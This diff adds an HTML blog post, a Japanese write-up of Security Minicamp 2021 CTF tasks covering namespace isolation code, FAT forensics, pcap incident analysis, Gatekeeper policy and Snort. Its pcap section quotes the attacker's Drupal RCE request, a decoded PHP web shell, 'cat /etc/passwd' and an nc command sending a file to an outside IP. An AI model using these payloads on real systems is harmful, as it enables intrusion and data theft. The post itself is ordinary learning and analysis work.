+        <span class=kt>void</span><span class=o>*</span> <span class=n>stack</span> <span class=o>=</span> <span class=n>mmap</span><span class=p>(</span><span class=nb>NULL</span><span class=p>,</span><span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>,</span><span class=n>PROT_READ</span><span class=o>|</span><span class=n>PROT_WRITE</span><span class=p>,</span>
+                <span class=n>MAP_PRIVATE</span><span class=o>|</span><span class=n>MAP_ANONYMOUS</span><span class=o>|</span><span class=n>MAP_GROWSDOWN</span><span class=o>|</span><span class=n>MAP_STACK</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>stack</span> <span class=o>==</span> <span class=n>MAP_FAILED</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=n>pid_t</span> <span class=n>c</span> <span class=o>=</span> <span class=n>clone</span><span class=p>((</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span><span class=n>isolated_child</span><span class=p>,</span><span class=n>stack</span><span class=o>+</span><span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>,</span><span class=n>CLONE_NEWPID</span><span class=o>|</span><span class=n>CLONE_NEWUSER</span><span class=o>|</span><span class=n>CLONE_NEWNS</span><span class=o>|</span><span class=n>SIGCHLD</span><span class=p>,</span><span class=o>&amp;</span><span class=n>args</span><span class=p>);</span>
+        <span class=k>if</span><span class=p>(</span><span class=n>c</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>){</span>
+                <span class=n>puts</span><span class=p>(</span><span class=s>&#34;clone failed!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+                <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=p>}</span>
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;ok: clone</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>write_ug_map</span><span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;ok: map</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+    <span class=c1>//    parent_install_network(c);
+</span><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=n>write</span><span class=p>(</span><span class=n>args</span><span class=p>.</span><span class=n>fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s>&#34;</span><span class=se>\0</span><span class=s>&#34;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+        <span class=n>printf</span><span class=p>(</span><span class=s>&#34;ok: write to pipe</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+        <span class=k>if</span> <span class=p>(</span><span class=n>waitpid</span><span class=p>(</span><span class=n>c</span><span class=p>,</span><span class=nb>NULL</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+  <span class=c1>//      parent_uninstall_network();
+</span><span class=c1></span><span class=p>}</span>
+
+<span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+        <span class=k>return</span> <span class=n>start_child</span><span class=p>();</span>
+<span class=p>}</span>
+</code></pre></div><p>flag が得られました。</p>
+<pre tabindex=0><code>hooray! you finally made it!
+your flag is: mc2021{y0u_l1nux_h4ck3r}
+</code></pre><p>flag: <code>mc2021{y0u_l1nux_h4ck3r}</code></p>
+<h2 id=講師の方の解説を見て新しく知ったこと>講師の方の解説を見て新しく知ったこと</h2>
+<p>unshare というコマンドがあり、先ほどの第一引数を <code>""</code> とする段階の後で、そのバイナリを <code>main</code> とすると</p>
+<pre tabindex=0><code>$ unshare -r ./main
+</code></pre><p>として flag を得ることができるというものでした。(実際にやってみるとできて驚きました) <code>unshare(2)</code>についてはまだよく分かっていないので後で調べてみたいと思います。コンテナランタイムでも <code>unshare(2)</code>を用いて namespace が切られているそうです。</p>
+<h1 id=day1-ファイルシステム>DAY1 ファイルシステム</h1>
+<p>sd カードのダンプイメージが与えられ、その中からフラグを発見せよというフォレンジックの問題でした。</p>
+<h2 id=時間中にやったこと-1>時間中にやったこと</h2>
+<p>まず初手 bz2 という拡張子に戸惑いながら、おりゃと <code>bzip2 -dc campfs.bin.bz2 > campfs.bin</code> をしました。少し時間が経ってから処理が終わります(4GB ほどあったようです)</p>
+<p>初手 <code>strings campfs.bin | grep mc</code> などを試みますがうまく行きません。(それはそう) しかし、file をして以下のようなファイルであることは分かりました。</p>
+<pre tabindex=0><code>campfs.bin: DOS/MBR boot sector, code offset 0x58+2, OEM-ID &quot;MSWIN4.1&quot;, sectors/cluster 8, Media descriptor 0xf8, sectors/track 63, heads 255, sectors 8388608 (volumes &gt; 32 MB), FAT (32 bit), sectors/FAT 8184, serial number 0x6e2650fe, label: &quot;MINISECCAMP&quot;
+</code></pre><p>label あたりが粋な感じがしてテンションが上がりますね。</p>
+<p>ここで講義中、「実際の業務ではこのように手で読むことはほとんどありません。でもいざというときに使えると強い」とあったので、これは時間もないしツールを使ってみた方がいいか！と思いツール探しの旅に出ます。(後から分かったのですがこれは想定解法ではありませんでした。土下座)</p>
+<p>「memory dump forensics」と調べると Volatility というツールがよさそうですがインストールして少し使ってみても分かりませんでした。<br>
+次に、「FAT recovery github」とかで調べると以下のツールがヒットしました。</p>
+<p><a href=https://github.com/Gregwar/fatcat>https://github.com/Gregwar/fatcat</a></p>
+<p>なんかこれを使うと、</p>
+<pre tabindex=0><code>$ ./tool/fatcat/build/fatcat campfs.bin -l /
+Listing path /
+Directory cluster: 2
+f 13/11/2021 14:30:52  _DSC0001.JPG                                       c=3 s=6108843 (5.82585M)
+f 13/11/2021 14:30:54  _DSC0003.JPG                                       c=1495 s=7188587 (6.85557M)
+f 13/11/2021 14:30:58  _DSC0004.JPG                                       c=3251 s=6729569 (6.41782M)
+f 13/11/2021 14:33:20  SECRET.ZIP                                         c=4894 s=6064993 (5.78403M)
+</code></pre><p>このように SECRET.ZIP が見えます。このあと <code>r</code> オプションを用いて SECRET.ZIP を取り出しますが password がかかっていて見れません。きっと JPG の方に password が 3 分割されて書かれているんでしょう！写真を見てみます！</p>
+<p>YAMAHA のアンプ？の写真<br>
+ルータっぽい写真<br>
+桃鉄の画像</p>
+<p>password ないやん</p>
+<p>というわけで気を取り直して <code>d</code> オプションで削除されたファイルを見てみます。</p>
+<pre tabindex=0><code>$ ./tool/fatcat/build/fatcat campfs.bin -d -l /
+Listing path /
+Directory cluster: 2
+f 13/11/2021 14:30:52  _DSC0001.JPG                                       c=3 s=6108843 (5.82585M)
+f 13/11/2021 14:30:54  _DSC0003.JPG                                       c=1495 s=7188587 (6.85557M)
+f 13/11/2021 14:30:58  _DSC0004.JPG                                       c=3251 s=6729569 (6.41782M)
+f 13/11/2021 14:33:20  SECRET.ZIP                                         c=4894 s=6064993 (5.78403M)
+f 13/11/2021 14:40:48  ASSWORD.TXT                                        c=6376 s=272 (272B) d
+</code></pre><p><code>PASSWORD.TXT</code> が見えます。これは講義で最初の文字が埋められて欠けてしまうやつで <code>P</code> が抜けているんでしょう。FATCAT の FAT Undelete Tutorial にしたがって、以下のようにするとパスワードのヒントを得ます。</p>
+<pre tabindex=0><code>$ ./tool/fatcat/build/fatcat campfs.bin -r ASSWORD.TXT
+! Trying to read a deleted file, enabling deleted mode
+SECRET.ZIPのパスワードは &quot;CLUSTER_(開始クラスタ番号)_LOCK&quot; にしてみました。
+
+クラスタ番号は10進数です。
+例えば 0x1234 だった場合は 4660 になりますので
+CLUSTER_4660_LOCK
+
+がパスワードになっています。
+</code></pre><p>今回だと <code>4894</code> がクラスタ番号ですね(<code>c=</code>)というわけで無事に ZIP のパスワード <code>CLUSTER_4894_LOCK</code> が分かりました。<br>
+zip を解凍するとフラグが画像に書かれていました。<br>
+flag: <code>ms2021{YOURE_FS_MASTER}</code></p>
+<p><code>FS_MASTER</code> ではなく Tool master になってしまった&mldr;本当にごめんなさい(復習します)</p>
+<h2 id=講師の方の解説を見て新しく知ったこと-1>講師の方の解説を見て新しく知ったこと</h2>
+<p>講師の方は真面目に手で解いていたのでうお～申し訳ねえ～と思いながら見ていました。とはいえ講義でやったことをやれば削除されたファイルの復元などはすぐにできそうです。</p>
+<h1 id=day2-サイバー攻撃対応入門>DAY2 サイバー攻撃対応入門</h1>
+<p>任意コード実行がされた攻撃ログを見て持ち出されたデータの中にあるフラグを pcap ファイルから見つける問題でした。</p>
+<h2 id=時間中にやったこと-2>時間中にやったこと</h2>
+<p>これは CTF の Network っぽいなと思いながら http でフィルタをかけて Follow HTTP Stream をして怪しい通信を見つけます。</p>
+<pre tabindex=0><code>POST /?q=user/password&amp;name[%23post_render][]=passthru&amp;name[%23type]=markup&amp;name[%23markup]=echo%20PD9waHAgaWYoaXNzZXQoJF9QT1NUWydjJ10pKXsgc3lzdGVtKGJhc2U2NF9kZWNvZGUoc3RyX3JvdDEzKCRfUE9TVFsnYyddKSkpOyB9IA==%20|%20base64%20-d%20%3E%20create.php
+</code></pre><p>このへんいかにも base64 して create.php に書き込んで shell 張ってます！という感じがしますね！CyberChef で該当部分を decode します。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span> <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>])){</span> <span class=nx>system</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nx>str_rot13</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;c&#39;</span><span class=p>])));</span> <span class=p>}</span>
+</code></pre></div><p>rot13 してから base64decode して、それを exec しているようです。攻撃者はおそらくこれを使っているはずなので、この後の通信の <code>POST /create.php?</code> の <code>c=</code> の後の文字列を rot13 して base64decode していくと、</p>
+<pre tabindex=0><code>cat /etc/passwd
+</code></pre><pre tabindex=0><code>openssl aes-256-cbc -e -in flag.txt -out flag.enc -pass pass:change_option_e_to_d_for_decrypt
+</code></pre><pre tabindex=0><code>nc -w 2 192.168.180.163 1337 &lt; flag.enc
+</code></pre><p>が見つかります。1337 ポートの通信が気になります。<code>tcp.port == 1337</code>をして、Follow TCP Stream をして、1337 宛ての通信を見てみると、以下のようなデータが出てきます。</p>
+<div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=c1># ascii</span>
+Salted__..&lt;....K............ot5.x..SX........~.h.Y..<span class=o>]</span>.n....!.!..
+<span class=c1># raw</span>
+53616c7465645f5fafde3cc7d1ab8e4bda00901bbbe2adc913f09faa6f7435d778fd2e5358a6e5b493f1dcffd37ea4688e5983e05dac6ef4a187f7219f21b00e
+</code></pre></div><p>これのバイナリデータを取ってきて(確か YAML にしたら base64encode されていたのでそれを使った)手元で以下のようにすると flag が書かれたテキストファイルが得られました。</p>
+<pre tabindex=0><code>openssl aes-256-cbc -d -in flag.enc -out flag -pass pass:change_option_e_to_d_for_decrypt
+</code></pre><p>flag: <code>mc2021{H4PPY_M1N1C4MP_GR4DU4T10N}</code></p>
+<h2 id=講師の方の解説を見て新しく知ったこと-2>講師の方の解説を見て新しく知ったこと</h2>
+<p>Drupal であることはちらっと見て分かりましたが意識をしていなかったので、Drupal の脆弱性で今回使われているものを調べておこうと思います。</p>
+<h1 id=day3-コンテナセキュリティ-解けなかった>DAY3 コンテナセキュリティ (解けなかった)</h1>
+<p>Rego で Gatekeeper 用のポリシーを実装する。SHA-256 ハッシュ値 (例: ubuntu@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2)で指定されていなければ reject する。</p>
+<h2 id=時間中にやったこと-3>時間中にやったこと</h2>
+<p>他の問題、特に DAY2 マルウェアのトラフィックを分析・検知してみようが一生うまく行かずにつらいなあとなって時間を消費していたので全く見ることができませんでした(ごめんなさい 🙇)</p>
+<p>後半で大ヒントが出題されて、正規表現ゲームになっていたので僕もいくつか正規表現を投げました。問題文は大ヒント部分しか読めていないです。(ごめんなさい&mldr;)</p>
+<p>結果、惜しいところまでは行ったようです。</p>
+<h2 id=講師の方の解説を見て新しく知ったこと-3>講師の方の解説を見て新しく知ったこと</h2>
+<p>正規表現だなあという気持ちになったので、正規表現の <code>.*</code> と <code>.+</code> の違い(0 文字が許されるかどうか)あたり思い出さないとなと思いました。あと SHA256 の Docker Image については大文字アルファベットが使われないんですね(それはそうか)<br>
+正規表現、OSS で実装が見えるものについてバイパスされがちみたいな印象があるので Regex Master になって安全な実装ができるようになりたいですね。</p>
+<h1 id=day2-マルウェアのトラフィックを分析検知してみよう-解けなかった>DAY2 マルウェアのトラフィックを分析・検知してみよう (解けなかった)</h1>
+<p>snort のルールに沿ったパケットを送ってくださいという問題でした。</p>
+<h2 id=時間中にやったこと-4>時間中にやったこと</h2>
+<p>これ snort 使ってパケット送れるのかな、いやこれログ収集ソフトでは？でも snort 使わないと講義習った上でのあれではないしなあと思って snort を一生動かしていました。ログに何も記録されず、おかしいなあと思いながら色々ガチャガチャしていました。たぶん snort を 1 時間くらいは触っていたと思います&mldr;</p>
+<h2 id=講師の方の解説を見て新しく知ったこと-4>講師の方の解説を見て新しく知ったこと</h2>
+<p>netcat を使って普通に UDP パケットを送信すればよかったようです！！！snort はおそらく講師側で動いていてそれに合うパケットを送って返却されたものがフラッグになっているというものでした！！！かなしい！！！</p>
+<h1 id=感想>感想</h1>
+<p>ミニキャンプ修了できた気がしなくて厳しい気持ちになりましたが、楽しめました。とても悔しかったのですがおそらく年齢的に今年 25 でリベンジの機会はなさそうなので、苦手分野のネットワークも、好きな分野の低レイヤもコツコツ精進して行きたいと思います。<br>
+講師陣のみなさん、インフラ提供をしてくださった方々、運営事務の方々、ありがとうございました！</p>
+</article>
+<footer>
+<p class=license>
+This document is licensed under
+<a href=https://creativecommons.org/licenses/by/4.0/ target=_blank rel="noopener noreferrer">CC-BY-4.0</a>
+</p>
+<p class=repository>
+<a href=https://github.com/uta8a/discussion/discussions/1 target=_blank rel="noopener noreferrer">discussion</a>にコメントする
+</p>
+</footer>
+</main>
+</body>
+</html>
